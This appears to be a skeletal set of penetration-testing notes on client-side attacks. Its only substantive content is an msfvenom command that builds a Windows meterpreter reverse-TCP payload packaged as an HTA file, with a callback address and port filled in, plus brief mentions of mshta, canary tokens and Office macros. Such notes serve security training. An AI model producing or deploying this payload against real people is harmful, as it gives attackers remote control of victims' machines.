# Client-Side Attack

## information gathering

### canary

<https://canarytokens.org/generate>

## HTA

### mshta

VBscript Wscript.Shell powershell.exe

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.8.1 LPORT=4444 -f hta-psh -o shell.hta
```

## Office

### Macro

### OLE
